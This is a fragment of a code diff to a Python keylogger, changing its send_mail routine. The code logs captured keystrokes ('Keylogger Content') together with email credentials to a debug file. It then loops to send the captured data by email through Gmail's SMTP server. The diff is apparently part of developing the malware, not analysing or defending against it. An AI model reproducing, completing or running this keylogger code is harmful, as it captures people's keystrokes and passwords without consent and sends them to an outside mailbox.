@@ -35,13 +35,8 @@ if not path.isfile(dir):
     
 def send_mail():
     global data
-	
-    file_object = open(debugFile, "a+")
-    file_object.write("INPUT: " + DEBUG_INPUT)
-    file_object.close()
-	
     while True:
-        write_to_debug_file("===== SENDING EMAIL: DEBUG MODE =====\n" + "Data Content Length: " + str(len(data)) + "\n" + "Keylogger Content: " + data + "\n" + "Email: " + EEMAIL + "\n" + "Password: " + EPASS + "\n" + "[*] SENDING EMAIL NOW" + "\n")
+        write_to_debug_file("\n===== SENDING EMAIL: DEBUG MODE =====\n" + "Data Content Length: " + str(len(data)) + "\n" + "Keylogger Content: " + data + "\n" + "Email: " + EEMAIL + "\n" + "Password: " + EPASS + "\n" + "[*] SENDING EMAIL NOW" + "\n")
         if len(data) > 0:
             timeInSecs = datetime.datetime.now()
             SERVER = "smtp.gmail.com"
